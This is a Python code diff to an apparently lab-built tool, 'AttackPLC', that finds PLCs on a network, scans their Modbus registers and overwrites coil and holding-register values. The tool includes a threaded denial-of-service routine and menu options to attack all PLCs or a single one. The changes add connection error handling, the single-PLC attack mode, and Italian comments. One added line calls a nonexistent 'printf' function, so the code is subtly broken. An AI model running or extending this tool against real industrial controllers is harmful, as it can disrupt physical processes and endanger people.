@@ -369,8 +369,12 @@ class AttackPLC:
     """
 
     def dos_attack(self, plc, reg_type, modbus_addr, value):
-        mb = ModbusClient(plc, 502)
-        mb.connect()
+        try:
+            mb = ModbusClient(plc, 502)
+            mb.connect()
+        except:
+            print("Connection failed")
+            return
 
         if reg_type == "coil":
             addr = modbus_addr / 8
@@ -400,9 +404,10 @@ class AttackPLC:
 
             plc_list = json.loads(plc_list)
 
-            # print(list(plc_list.keys())[0])
+            # Va bene così, perchè devo solo elencare i registri
+            # che ho letto prima. Per vedere quali sono, basta prendere
+            # la prima PLC in lista, le altre avranno gli stessi registri
             tmp_plc = list(plc_list.keys())[0]
-
             tmp_plc_data = plc_list[tmp_plc]
 
             print("Available registers: \n")
@@ -496,6 +501,7 @@ class AttackPLC:
 
             choice = input("Select PLC: ")
 
+            # Controllo se esiste il file con la scansione della PLC selezionata
             if not os.path.exists(f'{plc_list[str(choice)]}.json'):
                 new_scan = input("Scan not found. Perform a new scan for this PLC? [y/n] ")
                 if new_scan == 'n' or new_scan == 'N':
@@ -508,22 +514,28 @@ class AttackPLC:
 
             plc_data = json.loads(plc_data)
 
-            # Questa serve solo per la print successiva...
-            for ip in plc_data:
-                plc = ip
+            # Recupero l'indirizzo IP della PLC
+            plc = list(plc_data.keys())[0]
+
+            # Recupero le chiavi del registro
+            tmp_plc_data = plc_data[plc]
 
             print(f"Available registers and values for {plc}: \n")
-            print("Reg     | val")
-            print("-------------")
 
-            for key, val in plc_data.items():
-                for holreg, val2 in plc_data[key]['HoldingOutputRegisters'].items():
-                    print(holreg + '    | ' + val2)
+            for key, val in tmp_plc_data.items():
+                if key == "HoldingOutputRegisters":
+                    print(key)
+                    print("-----------")
 
-                print("        | ")
+                    for key2, val2 in tmp_plc_data[key].items():
+                        print(key2 + ' = ' + val2)
 
-                for coilreg, val3 in plc_data[key]['Coils'].items():
-                    print(coilreg + ' | ' + val3)
+                if key == "Coils":
+                    print("\n" + key)
+                    print("-----------")
+
+                    for key3, val3 in tmp_plc_data[key].items():
+                        print(key3 + ' = ' + val3)
 
             choice_reg = input("Select register: ")
 
@@ -561,9 +573,16 @@ class AttackPLC:
                     thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, modbus_addr, int(value)))
                     thr1.start()
                 else:
-                    mb = ModbusClient(plc, 502)
-                    mb.connect()
+                    print(f'Connecting to {plc}')
 
+                    try:
+                        mb = ModbusClient(plc, 502)
+                        mb.connect()
+                    except:
+                        print("Connection failed")
+                        return
+
+                    printf("Writing on register........")
                     mb.write_single_register(modbus_addr, int(value))
 
                     mb.close()
@@ -590,18 +609,21 @@ def main():
         print("2 - Scan all PLCs registers")
         print("3 - Scan single PLC registers")
         print("4 - Attack PLCs")
-        print("5 - Exit\n")
+        print("5 - Attack single PLC")
+        print("6 - Exit\n")
         choice = input("Enter your choice: ")
 
         if choice == "1":
             ap.find_plcs()
         elif choice == "2":
-            ap.scan_plcs()
+            ap.scan_plcs('all')
         elif choice == "3":
             ap.scan_plcs('single')
         elif choice == "4":
             ap.change_register_value('all')
         elif choice == "5":
+            ap.change_register_value('single')
+        elif choice == "6":
             os._exit(1)
         else:
             print("Invalid choice\n")
